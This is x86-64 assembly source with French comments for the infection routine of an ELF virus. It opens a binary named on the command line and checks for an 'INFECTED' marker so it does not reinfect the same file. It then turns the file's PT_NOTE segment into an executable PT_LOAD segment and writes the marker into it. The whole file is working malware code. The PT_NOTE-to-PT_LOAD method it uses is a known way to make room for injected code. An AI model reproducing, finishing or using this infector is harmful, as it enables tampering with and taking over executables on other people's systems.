section .data
    magic_bytes db 0x7F, "ELF"    
    err_msg db "Ce n'est pas un fichier ELF valide", 10
    err_len equ $ - err_msg
    dir_msg db "C'est un répertoire", 10
    dir_len equ $ - dir_msg
    elf_msg db "C'est un fichier ELF.", 10
    elf_len equ $ - elf_msg
    mod_msg db "Un segment PT_NOTE a été modifié en PT_LOAD avec les permissions RE", 10
    mod_len equ $ - mod_msg
    already_mod_msg db "Ce fichier a déjà été modifié", 10
    already_mod_len equ $ - already_mod_msg
    signature db "INFECTED", 0     
    sig_len equ $ - signature
    
section .bss
    fd resq 1
    filename resq 1
    elf_header resb 64
    stat_buf resb 144
    phdr resb 56          
    note_data resb 1024   ; Buffer pour sauvegarder les données du segment NOTE
    sig_buf resb 9        

section .text
global _start

_start:
    pop rdi                 
    pop rdi                 
    pop rdi                 
    mov [filename], rdi
    
    mov rax, 4             
    mov rsi, stat_buf
    syscall
    test rax, rax
    js exit
    
    mov rax, qword [stat_buf + 24]
    and rax, 0o170000
    cmp rax, 0o040000
    je is_directory
    
    mov rdi, [filename]
    mov rax, 2             
    mov rsi, 2             
    syscall
    cmp rax, 0
    jl exit
    mov [fd], rax
    
    mov rdi, rax
    mov rax, 0             
    mov rsi, elf_header
    mov rdx, 64
    syscall
    
    mov rsi, elf_header
    mov rdi, magic_bytes
    mov rcx, 4
    repe cmpsb
    jne not_elf
    
    mov rax, 1
    mov rdi, 1
    mov rsi, elf_msg
    mov rdx, elf_len
    syscall

    ; D'abord, chercher si le fichier a déjà été modifié
    movzx rcx, word [elf_header + 56]  
    mov rbx, 0                         

check_if_modified:
    cmp rbx, rcx
    jge scan_headers      ; Si aucune signature trouvée, on continue avec la modification

    ; Calculer l'offset du Program Header
    movzx rax, word [elf_header + 54]  
    mul rbx
    add rax, qword [elf_header + 32]   
    
    mov rdi, [fd]
    mov rsi, rax                       
    xor rdx, rdx                       
    mov rax, 8                         
    syscall
    
    mov rdi, [fd]
    mov rax, 0                         
    mov rsi, phdr
    mov rdx, 56                        
    syscall
    
    ; Lire la signature potentielle
    mov rdi, [fd]
    mov rsi, qword [phdr + 8]          ; p_offset
    add rsi, qword [phdr + 32]         ; Aller à la fin du segment
    sub rsi, sig_len                   ; Reculer de la taille de la signature
    xor rdx, rdx
    mov rax, 8                         
    syscall
    
    mov rdi, [fd]
    mov rax, 0                         
    mov rsi, sig_buf
    mov rdx, sig_len
    syscall
    
    mov rsi, sig_buf
    mov rdi, signature
    mov rcx, sig_len
    repe cmpsb
    je file_already_modified    ; Si on trouve la signature, sortir directement
    
    inc rbx
    jmp check_if_modified

scan_headers:
    ; Reset du compteur pour la recherche de PT_NOTE
    movzx rcx, word [elf_header + 56]  
    mov rbx, 0                         

find_pt_note:
    cmp rbx, rcx
    jge exit

    movzx rax, word [elf_header + 54]  
    mul rbx
    add rax, qword [elf_header + 32]   
    
    mov rdi, [fd]
    mov rsi, rax                       
    xor rdx, rdx                       
    mov rax, 8                         
    syscall
    
    mov rdi, [fd]
    mov rax, 0                         
    mov rsi, phdr
    mov rdx, 56                        
    syscall
    
    mov eax, dword [phdr]
    cmp eax, 4                         
    je modify_header
    
    inc rbx
    jmp find_pt_note

modify_header:
    ; Sauvegarder d'abord les données du segment NOTE
    mov rdi, [fd]
    mov rsi, qword [phdr + 8]         
    xor rdx, rdx                       
    mov rax, 8                         
    syscall
    
    mov rdi, [fd]
    mov rax, 0                         
    mov rsi, note_data
    mov rdx, qword [phdr + 32]        
    syscall
    
    ; Modifier le type en PT_LOAD
    mov dword [phdr], 1
    mov dword [phdr + 4], 5           ; PF_R | PF_X
    
    ; Écrire le header modifié
    mov rdi, [fd]
    movzx rax, word [elf_header + 54]  
    mul rbx
    add rax, qword [elf_header + 32]   
    
    mov rdi, [fd]
    mov rsi, rax
    xor rdx, rdx
    mov rax, 8                         
    syscall
    
    mov rdi, [fd]
    mov rax, 1                         
    mov rsi, phdr
    mov rdx, 56
    syscall
    
    ; Réécrire les données originales
    mov rdi, [fd]
    mov rsi, qword [phdr + 8]         
    xor rdx, rdx
    mov rax, 8                         
    syscall
    
    mov rdi, [fd]
    mov rax, 1                         
    mov rsi, note_data
    mov rdx, qword [phdr + 32]        
    syscall
    
    ; Écrire la signature à la fin du segment
    mov rdi, [fd]
    mov rsi, qword [phdr + 8]         
    add rsi, qword [phdr + 32]        
    sub rsi, sig_len                  
    xor rdx, rdx
    mov rax, 8                         
    syscall
    
    mov rdi, [fd]
    mov rax, 1                         
    mov rsi, signature
    mov rdx, sig_len
    syscall
    
    mov rax, 1
    mov rdi, 1
    mov rsi, mod_msg
    mov rdx, mod_len
    syscall
    jmp exit

file_already_modified:
    mov rax, 1
    mov rdi, 1
    mov rsi, already_mod_msg
    mov rdx, already_mod_len
    syscall
    jmp exit              ; Sortir immédiatement si le fichier est déjà modifié

is_directory:
    mov rax, 1
    mov rdi, 1
    mov rsi, dir_msg
    mov rdx, dir_len
    syscall
    jmp exit

not_elf:
    mov rax, 1
    mov rdi, 1
    mov rsi, err_msg
    mov rdx, err_len
    syscall
    jmp exit

exit:
    mov rax, 3                         
    mov rdi, [fd]
    syscall
    
    mov rax, 60                        
    xor rdi, rdi
    syscall